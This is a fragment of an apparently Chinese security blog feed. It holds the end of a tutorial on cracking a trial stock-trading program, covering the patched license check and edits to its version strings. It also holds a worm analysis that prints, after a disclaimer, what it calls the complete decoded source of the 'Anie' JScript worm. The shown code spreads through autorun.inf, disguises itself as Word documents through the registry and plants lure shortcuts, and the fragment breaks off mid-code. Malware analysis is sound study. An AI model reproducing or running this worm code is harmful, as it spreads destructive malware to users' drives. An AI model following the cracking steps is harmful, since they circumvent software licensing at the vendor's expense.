class="number">0</span>];</span><br><span class="line">            struct3.bool_0 = Conversions.ToBoolean(strArray[<span class="number">1</span>]);</span><br><span class="line">            struct3.string_1 = strArray[<span class="number">2</span>];</span><br><span class="line">            struct3.bool_1 = Conversions.ToBoolean(strArray[<span class="number">3</span>]);</span><br><span class="line">            struct3.string_2 = strArray[<span class="number">4</span>];</span><br><span class="line">            struct3.bool_2 = Conversions.ToBoolean(strArray[<span class="number">5</span>]);</span><br><span class="line">            struct3.string_3 = strArray[<span class="number">6</span>];</span><br><span class="line">            struct3.bool_3 = Conversions.ToBoolean(strArray[<span class="number">7</span>]);</span><br><span class="line">            struct3.decimal_0 = Conversions.ToDecimal(strArray[<span class="number">8</span>]);</span><br><span class="line">            struct3.string_4 = strArray[<span class="number">9</span>];</span><br><span class="line">            struct3.bool_4 = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception exception1)</span><br><span class="line">        &#123;</span><br><span class="line">            ProjectData.SetProjectError(exception1);</span><br><span class="line">            Exception exception = exception1;</span><br><span class="line">            struct3.bool_4 = <span class="keyword">true</span>;</span><br><span class="line">            ProjectData.ClearProjectError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception3)</span><br><span class="line">    &#123;</span><br><span class="line">        ProjectData.SetProjectError(exception3);</span><br><span class="line">        Exception exception2 = exception3;</span><br><span class="line">        GClass3.smethod_8(<span class="string">"注册服务错误："</span> + exception2.Message.Replace(<span class="string">"\r"</span>, <span class="string">""</span>).Replace(<span class="string">"\n"</span>, <span class="string">""</span>), <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (((WebException) exception2).Status != WebExceptionStatus.Timeout)</span><br><span class="line">        &#123;</span><br><span class="line">            struct3.bool_4 = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ProjectData.ClearProjectError();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> struct3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="验证效果">验证效果</h3><p>修改验证方法后，将程序重新保存，再次运行发现该软件已经成功被破解了。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/zdxstock-trial-crack/cracked.jpg" alt=""></p>
<h2 id="版权修改">版权修改</h2><p>虽然完成了软件的破解，但是从图片中我们可以看到，在关于对话框中，软件版本信息的标题仍为试用版；软件主界面的用户信息显示为默认的“亲”，并且该程序的文件属性的描述信息也显示为试用版，现在我们把这些信息修改掉。</p>
<h3 id="修改文件属性">修改文件属性</h3><p>文件属性中的描述信息可以使用PE资源编辑器(如ResHacker)进行修改，直接将FileDescription字段中的试用版删掉，然后重新编译脚本，将文件保存或另存为即完成了文件属性的修改。</p>
<h3 id="修改用户信息">修改用户信息</h3><p>通过之前的分析可以知道，注册验证逻辑中需要保证发送和返回的用户信息是一致的，所以需要找到<code>GClass3.string_1</code>初始化的地方，将其修改为想要的值，同时修改之前构造的返回字符串，这里我将其修改为”Cracked by LuoXiaohei”。</p>
<h3 id="修改关于信息">修改关于信息</h3><p>通过分析可以发现，关于对话框中的信息是通过AssemblyInfo定义的，在Reflextor中我并没有发现可以直接修改AssemblyInfo的方法，所以我直接使用了WinHex修改程序文件。<br>AssemblyInfo中的信息在程序文件中是以UTF-8编码保存的，我们可以通过代码将”智达信股票自动交易软件试用版”编码为UTF-8格式并获取Hex值，这里得到的值是</p>
<blockquote>
<p>E699BAE8BEBEE4BFA1E882A1E7A5A8E887AAE58AA8E4BAA4E69893E8BDAFE4BBB6E8AF95E794A8E78988</p>
</blockquote>
<p>利用相同的方法，可以得到”正式版”的UTF-8编码的Hex值，然后利用WinHex将”试用版”修改为”正式版”。</p>
<h2 id="最终成果">最终成果</h2><p><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/zdxstock-trial-crack/final.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[今天在邮箱里见到有人请求帮忙破解一款用于自动操盘的软件，于是便看了一下，虽然最终成功破解掉了这款软件，但并未将其发送给求助者。在我看来，破解更多是为了学习和研究，而在经济条件允许的情况下，为软件付费，支持正版是每个人都该做的。]]>
    
    </summary>
    
      <category term="Crack" scheme="http://smvirus.com/tags/Crack/"/>
    
      <category term="软件破解" scheme="http://smvirus.com/categories/%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[VBS蠕虫 Anie 代码分析]]></title>
    <link href="http://smvirus.com/2015/03/14/anie-vbs-worm-code-analysis/"/>
    <id>http://smvirus.com/2015/03/14/anie-vbs-worm-code-analysis/</id>
    <published>2015-03-14T08:49:47.000Z</published>
    <updated>2015-03-31T15:33:53.000Z</updated>
    <content type="html"><![CDATA[<p>Anie 是一个VBS蠕虫，命名源于其会创建一系列名为 Annie 的文件，鉴于计算机病毒命名时不应直接使用病毒样本中出现的字符串，所以将其命名为 Anie。<br>该病毒最早出现的时间为2013年，国家为印尼。<br><a id="more"></a></p>
<h2 id="基本信息">基本信息</h2><blockquote>
<p>病毒名称：Worm.JS.AutoRun<br>病毒类型：蠕虫<br>样本长度：9,201 字节<br>样本md5：4d1a9f7559de521e1458021a1a7df7cf<br>文件类型：vbs<br>原文件名：Annie.sys<br>出现时间：2013-02-15<br>感染范围：Indonesia<br>感染目标：Intel 386 orlater processors and compatible processors</p>
</blockquote>
<h2 id="脚本解密">脚本解密</h2><p>直接用编辑器打开病毒样本，会发现样本内容为乱码，该样本使用了jscript.encode方式进行了加密，在<a href="http://www.sanxiang.org/jscript-decode.html" target="_blank" rel="external">这里</a>可以对其进行解密。<br><img src="http://7xicmh.com1.z0.glb.clouddn.com/blog/anie-vbs-worm-code-analysis/encoded.jpg" alt=""></p>
<h2 id="代码分析">代码分析</h2><h3 id="免责声明">免责声明</h3><p>本节代码是一个完整的VBS蠕虫病毒，仅以学习和交流目的展示，其执行后会感染磁盘驱动器、CD刻录机、网络驱动器等，会对系统造成极大破坏。<br>请勿复制、传播、执行以及使用本节中代码进行攻击等，否则自行承担一切因不当行为造成的后果及责任。</p>
<h3 id="病毒代码">病毒代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fso = <span class="keyword">new</span> ActiveXObject(<span class="string">'Scripting.FileSystemObject'</span>);</span><br><span class="line"><span class="keyword">var</span> Shell = <span class="keyword">new</span> ActiveXObject(<span class="string">'WScript.Shell'</span>);</span><br><span class="line"><span class="keyword">var</span> ScriptPath = WScript.ScriptFullName;</span><br><span class="line"><span class="keyword">var</span> Script = ReadText(ScriptPath);</span><br><span class="line"><span class="keyword">var</span> SystemPath = fso.GetSpecialFolder(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> SysPath = SystemPath + <span class="string">'\\drivers\\annie.sys'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectDrives</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (ScriptPath == SysPath) &#123;</span><br><span class="line">        <span class="comment">// 枚举驱动器集合</span></span><br><span class="line">        <span class="keyword">var</span> e = <span class="keyword">new</span> Enumerator(fso.Drives);</span><br><span class="line">        <span class="keyword">for</span> (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;</span><br><span class="line">            <span class="keyword">var</span> drv = e.item();</span><br><span class="line">            <span class="comment">// DriveType:UnknownType＝0；Removable＝1；Fixed=2；Remote=3；CDRom=4.</span></span><br><span class="line">            <span class="comment">// 如果是硬盘或者移动存储介质并且驱动器号不为'A:'并且驱动器可以访问</span></span><br><span class="line">            <span class="keyword">if</span> (((drv.DriveType == <span class="number">1</span> || drv.DriveType == <span class="number">2</span>) &amp;&amp; drv.Path != <span class="string">'A:'</span>) &amp;&amp; drv.IsReady) &#123;</span><br><span class="line">                <span class="comment">// 拷贝脚本文件到驱动器根目录，命名为annie.ani。</span></span><br><span class="line">                CopyScriptFile(drv.Path + <span class="string">'\\annie.ani'</span>);</span><br><span class="line">                <span class="comment">// 创建AutoRun文件，将annie.ani设置为自动运行。</span></span><br><span class="line">                CreateAutoRunFile(drv.Path + <span class="string">'\\autorun.inf'</span>);</span><br><span class="line">                CreateShortcut(drv.Path + <span class="string">'\\'</span>);</span><br><span class="line">                InfectFolder(drv.Path + <span class="string">'\\'</span>);</span><br><span class="line">                InfectSubFolder(drv.Path + <span class="string">'\\'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetExtensionName</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fso.GetExtensionName(filename).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TryOpenTheOriginalFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> path = ScriptPath.substr(<span class="number">0</span>, ScriptPath.length - <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (fso.FileExists(path + <span class="string">'.docx'</span>)) &#123;</span><br><span class="line">        OpenTheOriginalFile(path, <span class="string">'.docx'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fso.FileExists(path + <span class="string">'.doc'</span>)) &#123;</span><br><span class="line">        OpenTheOriginalFile(path, <span class="string">'.doc'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fso.FileExists(path + <span class="string">'.rtf'</span>)) &#123;</span><br><span class="line">        OpenTheOriginalFile(path, <span class="string">'.rtf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    shell.run(<span class="string">'cscript.exe //e:jscript '</span> + SysPath + <span class="string">' /r'</span>, <span class="number">0</span>);</span><br><span class="line">    WScript.Sleep(<span class="number">100</span>);</span><br><span class="line">    shell.run(<span class="string">'cscript.exe //e:jscript '</span> + SysPath + <span class="string">' /s'</span>, <span class="number">0</span>);</span><br><span class="line">    WScript.Sleep(<span class="number">100</span>);</span><br><span class="line">    shell.Run(<span class="string">'cscript.exe //e:jscript '</span> + SysPath + <span class="string">' /n'</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFileSize</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fso.FileExists(filename)) &#123;</span><br><span class="line">        <span class="keyword">return</span> fso.GetFile(filename).Size;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetBaseName</span><span class="params">(filepath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fso.GetBaseName(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetDocType</span><span class="params">(filepath)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 获取html文件第一行文件类型说明</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fso.OpenTextFile(filepath, <span class="number">1</span>).ReadLine();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TestAndRepair</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (GetFileSize(SysPath) != <span class="number">9201</span>) &#123;</span><br><span class="line">        CopyScriptFile(SysPath);</span><br><span class="line">        shell.Run(<span class="string">'wscript.exe //e:jscript '</span> + SysPath + <span class="string">' /e'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreateAutoRunFile</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">'[autorun]\nshellexecute=wscript.exe //e:jscript annie.ani /a\nshell\\open\\command=wscript.exe //e:jscript annie.ani /a\nshell\\explore\\command=wscript.exe //e:jscript annie.ani /a'</span>;</span><br><span class="line">    <span class="keyword">if</span> (ReadText(filename) != str) &#123;</span><br><span class="line">        SetFileNewAttributes(filename, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> f = fso.CreateTextFile(filename, <span class="literal">true</span>);</span><br><span class="line">            f.Write(str);</span><br><span class="line">            f.Close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fso.FolderExists(filename)) &#123;</span><br><span class="line">                DeleteFolder(filename);</span><br><span class="line">                CreateAutoRunFile(filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            SetFileNewAttributes(filename, <span class="number">39</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadText</span><span class="params">(filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fso.OpenTextFile(filename, <span class="number">1</span>).ReadAll();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetFileNewAttributes</span><span class="params">(filename, newattributes)</span> </span>&#123;</span><br><span class="line"><span class="comment">// newattributes 可用值</span></span><br><span class="line"><span class="comment">// 常数          值     描述</span></span><br><span class="line"><span class="comment">// Normal        0      普通文件。没有设置任何属性。</span></span><br><span class="line"><span class="comment">// ReadOnly      1      只读文件。可读写。</span></span><br><span class="line"><span class="comment">// Hidden        2      隐藏文件。可读写。</span></span><br><span class="line"><span class="comment">// System        4      系统文件。可读写。</span></span><br><span class="line"><span class="comment">// Directory     16     文件夹或目录。只读。</span></span><br><span class="line"><span class="comment">// Archive       32     上次备份后已更改的文件。可读写。</span></span><br><span class="line"><span class="comment">// Alias         1024   链接或快捷方式。只读。</span></span><br><span class="line"><span class="comment">// Compressed    2048   压缩文件。只读。</span></span><br><span class="line">    <span class="keyword">if</span> (fso.FileExists(filename)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> f = fso.GetFile(filename);</span><br><span class="line">            f.Attributes = newattributes ;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ChangeJseRge</span><span class="params">(item)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 修改.JSE文件的默认值、默认图标等注册表信息</span></span><br><span class="line">    shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\'</span>, RegReadItem(RegReadItem(item) + <span class="string">'\\'</span>));</span><br><span class="line">    shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\DefaultIcon\\'</span>, RegReadItem(RegReadItem(item) + <span class="string">'\\DefaultIcon\\'</span>));</span><br><span class="line">    shell.RegWrite(<span class="string">'HKCR\\'</span> + RegReadItem(<span class="string">'.JSE'</span>) + <span class="string">'\\FriendlyTypeName'</span>, RegReadItem(RegReadItem(item) + <span class="string">'\\'</span>), <span class="string">'REG_EXPAND_SZ'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OpenTheOriginalFile</span><span class="params">(path, file_type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> open_command = RegReadItem(RegReadItem(file_type) + <span class="string">'\\shell\\Open\\command'</span>);</span><br><span class="line">        <span class="keyword">if</span> (open_command.match(<span class="regexp">/%1/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            shell.Run(open_command.replace(<span class="string">'%1'</span>, path + file_type));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            shell.Run(open_command + <span class="string">' "'</span> + path + file_type + <span class="string">'"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HideAndDisguise</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (ScriptPath == SysPath) &#123;</span><br><span class="line">        CopyScriptFile(SysPath);</span><br><span class="line">        InfectCDBuring();</span><br><span class="line">        InfectReg();</span><br><span class="line">        DisguiseJse();</span><br><span class="line">        WScript.Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DisguiseJse</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 修改.jse文件的注册表信息进行伪装</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ChangeJseReg(<span class="string">'.docx'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ChangeJseReg(<span class="string">'.doc'</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ChangeJseReg(<span class="string">'.rtf'</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">InfectSubFolder</span><span class="params">(path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 枚举子目录</span></span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">new</span> Enumerator(fso.GetFolder(path).SubFolders);</span><br><span class="line">    <span class="keyword">for</span> (e.moveFirst(); !e.atEnd(); e.moveNext()) &#123;</span><br><span class="line">        <span class="keyword">var</span> folder = e.item();</span><br><span class="line">        <span class="comment">// GetSpecialFolder(0) 返回WindowsFolder路径</span></span><br><span class="line">        <span class="keyword">if</span> ((folder.Name != <span class="string">'RECYCLER'</span> &amp;&amp; folder.Name != <span class="string">'System Volume Information'</span>) &amp;&amp; folder.Path != fso.GetSpecialFolder(<span class="number">0</span>)) &#123;</span><br><span class="line">            InfectFolder(folder.Path);</span><br><span class="line">            InfectSubFolder(folder.Path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CreateShortcut</span><span class="params">(path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> lnkname = path + <span class="string">'beautiful_girl_part_'</span> + i + <span class="string">'.lnk'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!fso.FileExists(lnkname)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> shortcut = shell.CreateShortcut(lnkname);</span><br><span class="line">                shortcut.IconLocation = <span class="string">'wmploc.dll,8'</span>;</span><br><span class="line">                